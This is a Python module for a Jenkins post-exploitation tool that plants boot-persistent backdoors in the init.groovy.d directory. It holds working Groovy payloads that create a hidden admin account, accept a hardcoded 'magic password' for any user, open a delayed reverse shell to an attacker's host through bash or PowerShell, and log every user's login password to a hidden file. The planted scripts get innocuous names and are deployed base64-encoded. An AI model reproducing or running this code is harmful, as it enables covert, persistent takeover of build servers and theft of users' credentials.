"""Boot-persistent backdoor via init.groovy.d injection.

Implements startup persistence by injecting Groovy scripts into Jenkins'
init.groovy.d directory, ensuring backdoor survival across server restarts.
"""

import base64
from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional


class PersistenceType(Enum):
    """Types of init.groovy.d persistence."""
    USER_CREATION = "user_creation"
    SECURITY_BYPASS = "security_bypass"
    REVERSE_SHELL = "reverse_shell"
    CREDENTIAL_LOGGER = "credential_logger"
    SCRIPT_CONSOLE = "script_console"
    CUSTOM = "custom"


@dataclass
class InitScriptResult:
    """Result of init script installation."""
    success: bool
    persistence_type: PersistenceType
    script_path: Optional[str] = None
    details: str = ""
    cleanup_command: Optional[str] = None


class InitScriptPersistence:
    """Jenkins init.groovy.d persistence mechanisms."""

    def __init__(self, session: Any):
        """Initialize init script persistence.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def get_jenkins_home(self) -> Optional[str]:
        """Get JENKINS_HOME path.

        Returns:
            JENKINS_HOME path if accessible
        """
        groovy_code = """
println System.getenv('JENKINS_HOME') ?: System.getProperty('JENKINS_HOME')
"""

        result = self.session.execute_groovy(groovy_code)
        return result.strip() if result and not result.startswith("ERROR") else None

    def install_admin_user_backdoor(self,
                                   username: str = "sysadmin",
                                   password: str = "P@ssw0rd123!",
                                   script_name: str = "001-security-init.groovy") -> InitScriptResult:
        """Install persistent admin user creation script.

        Args:
            username: Backdoor username
            password: Backdoor password
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        script_content = f"""
import jenkins.model.Jenkins
import hudson.security.HudsonPrivateSecurityRealm
import hudson.security.FullControlOnceLoggedInAuthorizationStrategy

def jenkins = Jenkins.getInstance()

def securityRealm = jenkins.getSecurityRealm()

if (securityRealm instanceof HudsonPrivateSecurityRealm) {{
    def existingUser = securityRealm.getUser('{username}')

    if (existingUser == null) {{
        def user = securityRealm.createAccount('{username}', '{password}')
        user.save()

        def strategy = jenkins.getAuthorizationStrategy()

        if (strategy instanceof FullControlOnceLoggedInAuthorizationStrategy) {{
            strategy.add(Jenkins.ADMINISTER, '{username}')
        }}

        jenkins.save()
    }}
}}
"""

        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.USER_CREATION,
            f"Admin user '{username}' will be created on every boot"
        )

    def install_security_bypass_backdoor(self,
                                        magic_password: str = "JenkinsBackdoor2025!",
                                        script_name: str = "002-auth-hook.groovy") -> InitScriptResult:
        """Install persistent SecurityRealm bypass.

        Args:
            magic_password: Backdoor password
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        script_content = f"""
import jenkins.model.Jenkins
import hudson.security.SecurityRealm
import org.acegisecurity.Authentication
import org.acegisecurity.AuthenticationManager
import org.acegisecurity.GrantedAuthority
import org.acegisecurity.providers.UsernamePasswordAuthenticationToken
import org.acegisecurity.GrantedAuthorityImpl

def jenkins = Jenkins.getInstance()
def originalRealm = jenkins.getSecurityRealm()

def hookedRealm = new SecurityRealm() {{

    @Override
    SecurityComponents createSecurityComponents() {{
        def originalComponents = originalRealm.createSecurityComponents()
        def originalAuthManager = originalComponents.manager

        def hookedAuthManager = new AuthenticationManager() {{
            @Override
            Authentication authenticate(Authentication auth) {{
                def password = auth.getCredentials()

                if (password == '{magic_password}') {{
                    def authorities = [new GrantedAuthorityImpl('authenticated'),
                                     new GrantedAuthorityImpl('ROLE_ADMIN')] as GrantedAuthority[]

                    def user = new org.acegisecurity.userdetails.User(
                        auth.getPrincipal().toString(),
                        '{magic_password}',
                        true, true, true, true,
                        authorities
                    )

                    return new UsernamePasswordAuthenticationToken(
                        user,
                        '{magic_password}',
                        authorities
                    )
                }} else {{
                    return originalAuthManager.authenticate(auth)
                }}
            }}
        }}

        return new SecurityComponents(hookedAuthManager, originalComponents.userDetails)
    }}

    @Override
    String getLoginUrl() {{
        return originalRealm.getLoginUrl()
    }}
}}

jenkins.setSecurityRealm(hookedRealm)
"""

        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.SECURITY_BYPASS,
            f"SecurityRealm bypass with magic password '{magic_password}' persists across reboots"
        )

    def install_reverse_shell_backdoor(self,
                                      lhost: str,
                                      lport: int,
                                      delay_seconds: int = 60,
                                      script_name: str = "003-maintenance.groovy") -> InitScriptResult:
        """Install boot-triggered reverse shell.

        Args:
            lhost: Listener host
            lport: Listener port
            delay_seconds: Delay before connecting
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        script_content = f"""
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

def executor = Executors.newSingleThreadScheduledExecutor()

executor.schedule({{
    try {{
        def command = ['/bin/bash', '-c', "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"]

        try {{
            command.execute()
        }} catch (Exception e) {{
            def windowsCommand = ['powershell', '-Command',
                "\\$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{{0}};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){{;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()}};\\$client.Close()"]
            windowsCommand.execute()
        }}
    }} catch (Exception ignored) {{}}
}}, {delay_seconds}, TimeUnit.SECONDS)
"""

        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.REVERSE_SHELL,
            f"Reverse shell to {lhost}:{lport} triggers {delay_seconds}s after boot"
        )

    def install_credential_logger(self,
                                 log_path: str = "/tmp/.jenkins_creds.log",
                                 script_name: str = "004-audit.groovy") -> InitScriptResult:
        """Install credential logging backdoor.

        Args:
            log_path: Path to credential log file
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        script_content = f"""
import jenkins.model.Jenkins
import hudson.security.SecurityRealm
import org.acegisecurity.Authentication
import org.acegisecurity.AuthenticationManager

def jenkins = Jenkins.getInstance()
def originalRealm = jenkins.getSecurityRealm()

def logFile = new File('{log_path}')
logFile.getParentFile()?.mkdirs()

def hookedRealm = new SecurityRealm() {{

    @Override
    SecurityComponents createSecurityComponents() {{
        def originalComponents = originalRealm.createSecurityComponents()
        def originalAuthManager = originalComponents.manager

        def hookedAuthManager = new AuthenticationManager() {{
            @Override
            Authentication authenticate(Authentication auth) {{
                try {{
                    def username = auth.getPrincipal()
                    def password = auth.getCredentials()
                    def timestamp = new Date().format('yyyy-MM-dd HH:mm:ss')

                    logFile.append("[$timestamp] User: $username, Pass: $password\\n")
                }} catch (Exception ignored) {{}}

                return originalAuthManager.authenticate(auth)
            }}
        }}

        return new SecurityComponents(hookedAuthManager, originalComponents.userDetails)
    }}

    @Override
    String getLoginUrl() {{
        return originalRealm.getLoginUrl()
    }}
}}

jenkins.setSecurityRealm(hookedRealm)
"""

        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.CREDENTIAL_LOGGER,
            f"All login attempts logged to {log_path}"
        )

    def install_script_console_enabler(self,
                                      script_name: str = "005-enable-console.groovy") -> InitScriptResult:
        """Install script ensuring script console is always enabled.

        Args:
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        script_content = """
import jenkins.model.Jenkins

def jenkins = Jenkins.getInstance()

jenkins.setDisableRememberMe(false)
jenkins.setNumExecutors(2)

jenkins.save()
"""

        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.SCRIPT_CONSOLE,
            "Script console and executors ensured enabled on boot"
        )

    def install_custom_script(self,
                            script_content: str,
                            script_name: str = "999-custom.groovy") -> InitScriptResult:
        """Install custom init.groovy.d script.

        Args:
            script_content: Groovy script content
            script_name: Init script filename

        Returns:
            InitScriptResult
        """
        return self._deploy_init_script(
            script_content,
            script_name,
            PersistenceType.CUSTOM,
            f"Custom script '{script_name}' installed"
        )

    def _deploy_init_script(self,
                           script_content: str,
                           script_name: str,
                           persistence_type: PersistenceType,
                           details: str) -> InitScriptResult:
        """Deploy script to init.groovy.d.

        Args:
            script_content: Script content
            script_name: Filename
            persistence_type: Type of persistence
            details: Description

        Returns:
            InitScriptResult
        """
        jenkins_home = self.get_jenkins_home()

        if not jenkins_home:
            return InitScriptResult(
                success=False,
                persistence_type=persistence_type,
                details="Could not determine JENKINS_HOME"
            )

        script_path = f"{jenkins_home}/init.groovy.d/{script_name}"

        encoded_content = base64.b64encode(script_content.encode()).decode()

        groovy_code = f"""
import java.util.Base64

def scriptPath = '{script_path}'
def encodedContent = '{encoded_content}'

def decodedBytes = Base64.getDecoder().decode(encodedContent)
def content = new String(decodedBytes, "UTF-8")

def scriptFile = new File(scriptPath)
scriptFile.getParentFile()?.mkdirs()

scriptFile.text = content

println "SUCCESS:Script deployed to " + scriptPath
"""

        result = self.session.execute_groovy(groovy_code)

        if "SUCCESS" in result:
            return InitScriptResult(
                success=True,
                persistence_type=persistence_type,
                script_path=script_path,
                details=details,
                cleanup_command=f"Remove: {script_path}"
            )
        else:
            return InitScriptResult(
                success=False,
                persistence_type=persistence_type,
                details=f"Deployment failed: {result}"
            )

    def list_init_scripts(self) -> list[str]:
        """List all init.groovy.d scripts.

        Returns:
            List of script paths
        """
        jenkins_home = self.get_jenkins_home()

        if not jenkins_home:
            return []

        groovy_code = f"""
def initDir = new File('{jenkins_home}/init.groovy.d')

if (!initDir.exists() || !initDir.isDirectory()) {{
    println "ERROR:Init directory not found"
    return
}}

initDir.listFiles()?.each {{ file ->
    if (file.isFile() && file.name.endsWith('.groovy')) {{
        println "SCRIPT:" + file.absolutePath
    }}
}}
"""

        result = self.session.execute_groovy(groovy_code)

        scripts = []
        for line in result.split('\n'):
            if line.startswith("SCRIPT:"):
                scripts.append(line[7:].strip())

        return scripts

    def remove_init_script(self, script_name: str) -> tuple[bool, str]:
        """Remove init script.

        Args:
            script_name: Script filename or full path

        Returns:
            Tuple of (success, message)
        """
        jenkins_home = self.get_jenkins_home()

        if not jenkins_home:
            return False, "Could not determine JENKINS_HOME"

        if "/" in script_name:
            script_path = script_name
        else:
            script_path = f"{jenkins_home}/init.groovy.d/{script_name}"

        groovy_code = f"""
def scriptFile = new File('{script_path}')

if (!scriptFile.exists()) {{
    println "ERROR:Script not found"
    return
}}

if (scriptFile.delete()) {{
    println "SUCCESS:Script deleted"
}} else {{
    println "ERROR:Failed to delete script"
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "SUCCESS" in result:
            return True, f"Script {script_name} removed"
        else:
            return False, result


def install_boot_persistence(session: Any,
                             persistence_type: str = "admin_user",
                             **kwargs) -> InitScriptResult:
    """Quick function to install boot persistence.

    Args:
        session: Jenkins session
        persistence_type: Type (admin_user, security_bypass, reverse_shell, etc.)
        **kwargs: Additional parameters for specific persistence type

    Returns:
        InitScriptResult
    """
    installer = InitScriptPersistence(session)

    if persistence_type == "admin_user":
        return installer.install_admin_user_backdoor(
            kwargs.get("username", "sysadmin"),
            kwargs.get("password", "P@ssw0rd123!")
        )
    elif persistence_type == "security_bypass":
        return installer.install_security_bypass_backdoor(
            kwargs.get("magic_password", "JenkinsBackdoor2025!")
        )
    elif persistence_type == "reverse_shell":
        return installer.install_reverse_shell_backdoor(
            kwargs.get("lhost"),
            kwargs.get("lport"),
            kwargs.get("delay_seconds", 60)
        )
    elif persistence_type == "credential_logger":
        return installer.install_credential_logger(
            kwargs.get("log_path", "/tmp/.jenkins_creds.log")
        )
    else:
        return InitScriptResult(
            success=False,
            persistence_type=PersistenceType.CUSTOM,
            details=f"Unknown persistence type: {persistence_type}"
        )


def cleanup_init_scripts(session: Any) -> tuple[int, int]:
    """Remove all suspicious init scripts.

    Args:
        session: Jenkins session

    Returns:
        Tuple of (removed_count, failed_count)
    """
    installer = InitScriptPersistence(session)
    scripts = installer.list_init_scripts()

    removed = 0
    failed = 0

    suspicious_patterns = [
        "security", "auth", "maintenance", "audit", "backdoor",
        "hook", "bypass", "admin", "001-", "002-", "003-", "004-", "005-", "999-"
    ]

    for script_path in scripts:
        script_name = script_path.split("/")[-1].lower()

        if any(pattern in script_name for pattern in suspicious_patterns):
            success, _ = installer.remove_init_script(script_path)
            if success:
                removed += 1
            else:
                failed += 1

    return removed, failed
